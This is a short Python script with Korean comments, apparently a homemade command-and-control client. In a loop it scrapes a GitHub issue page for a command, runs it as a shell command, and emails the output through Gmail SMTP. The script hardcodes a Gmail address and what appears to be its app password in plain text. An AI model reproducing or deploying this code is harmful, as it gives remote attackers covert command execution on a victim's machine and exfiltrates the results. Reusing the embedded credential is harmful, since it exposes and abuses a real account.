import os, time, requests, smtplib
from bs4 import BeautifulSoup
from decimal import MIN_EMIN
from email.mime.text import MIMEText  # 이메일 보낼때 시스템//smtp를 이용함
from email.mime.application import MIMEApplication # 메일의 첨부 파일을 base64 형식으로 변환


while True:  #무한루트로 실행시킴
    url_get = requests.get("https://github.com/toams0205/C2_server_pypy/issues/1")
    bs = BeautifulSoup(url_get.text, "html.parser")
    # html,soup함수로 github링크를 크롤링해서 안에 소스코드를 가져오는것.soup변수에 넣기
    github_issues = bs.select("p")
    # soup 소스코드에서 p 태그 찾기
    comment = github_issues[3].text
    # p태그 3번째 있는것을 textname 변수안에 넣기
    print(comment)
    print("SUCCEED / RECEIVE GITHUB COMMENT!!!")
    os.system(comment)
    # os.system으로 textname에 있는 변수를 cmd로 실행시킴
    print("SUCCEED / OPEN CMD!!!")
    cmd_text = os.popen(comment).read()
    # result 안에 textname을 cmd로 실행시킨 값을 넣어주기
    f_open = open(".txt","w")
    f_open.write(cmd_text)
    f_open.close()
    
    # smtp를 이용한 gmail로 result에 있는값 전송
    smtp_lib = smtplib.SMTP('smtp.gmail.com', 587)
    smtp_lib.starttls()
    smtp_lib.login('juhyoung19990205@gmail.com', 'rfjecjafpgvjoeon')
    text_recv = MIMEText(cmd_text)
    text_recv['Subject'] = 'SUCCEED / MAILING!!!'
    smtp_lib.sendmail("juhyoung19990205@gmail.com", "juhyoung19990205@gmail.com", text_recv.as_string())
    smtp_lib.quit()
    break


